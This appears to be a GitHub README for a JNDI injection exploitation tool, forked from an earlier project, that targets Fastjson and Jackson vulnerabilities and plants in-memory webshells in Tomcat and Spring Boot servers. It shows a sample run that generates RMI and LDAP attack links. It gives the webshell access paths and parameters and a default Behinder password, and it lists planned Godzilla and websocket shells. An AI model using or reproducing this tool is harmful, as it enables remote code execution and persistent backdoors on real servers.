## 介绍

JNDI注入利用工具，生成JNDI链接并启动后端相关服务，可用于Fastjson、Jackson等相关漏洞的验证。

最开始做项目的初衷是因为，遇到一些场景只能用RMI注入，无法使用LDAP注入，但是找了一段的时间之后发现Github中并没有很合心意的RMI注入工具，于是原本想自己做一个RMI注入内存马的工具，参考了一下welk1n佬的项目，结果发现佬写的精妙，可以改动的地方很少了已经，索性直接fork大佬的项目，添加工具。
原仓库地址：https://github.com/welk1n/JNDI-Injection-Exploit

冰蝎内存🐴默认密码:elysium

## 更新功能

### 内存马注入

直接运行jar包，可以看到添加了Tomcat Memshell、Behinder两种内存马（还在更新中）

```shell
$ java -jar JNDI-Injection-Memshell-1.0-SNAPSHOT-all.jar          
[ADDRESS] >> 127.0.0.1
[COMMAND] >> open /Applications/Calculator.app
----------------------------JNDI Links----------------------------
Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://127.0.0.1:1099/cl2cgx
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://127.0.0.1:1099/knlbmx
ldap://127.0.0.1:1389/knlbmx
Target environment(Tomcat Servlet Memshell):
rmi://127.0.0.1:1099/9tc7hk
ldap://127.0.0.1:1389/9tc7hk
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://127.0.0.1:1099/ma0np7
ldap://127.0.0.1:1389/ma0np7
Target environment(Springboot Interceptor Memshell):
rmi://127.0.0.1:1099/fnijcn
ldap://127.0.0.1:1389/fnijcn
Target environment(Behinder Servlet Memshell):
rmi://127.0.0.1:1099/oeczn8
ldap://127.0.0.1:1389/oeczn8

----------------------------Server Log----------------------------
2023-08-28 09:06:01 [JETTYSERVER]>> Listening on 0.0.0.0:8180
2023-08-28 09:06:01 [RMISERVER]  >> Listening on 0.0.0.0:1099
2023-08-28 09:06:01 [LDAPSERVER] >> Listening on 0.0.0.0:1389
```

- Tomcat Servlet Memshell

  - 命令执行Servlet内存马：路径/shell，参数cmd

   ![](https://raw.githubusercontent.com/MUYU212/JNDI-Injection-Memshell/main/screenshot/1.jpg)

- Behinder Servlet Memshell

  - 冰蝎Servlet内存马：路径/shell，密码:elysium

  ![](https://raw.githubusercontent.com/MUYU212/JNDI-Injection-Memshell/main/screenshot/2.jpg)

- Springboot interceptor Memshell
  - springboot的拦截器内存马，在request header中的command为入参执行命令

	![](https://raw.githubusercontent.com/MUYU212/JNDI-Injection-Memshell/main/screenshot/3.jpg)

## 待实现

- 添加filter、Interceptor类型的内存马
- 融合groovy的bypass利用链到项目中。
- 更新weblogic以及其他中间件的内存马注入环境
- 增加注入哥斯拉内存马的模块
- 加入websocket内存马



## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=MUYU212/JNDI-Injection-Memshell&type=Date)](https://star-history.com/#MUYU212/JNDI-Injection-Memshell&Date)
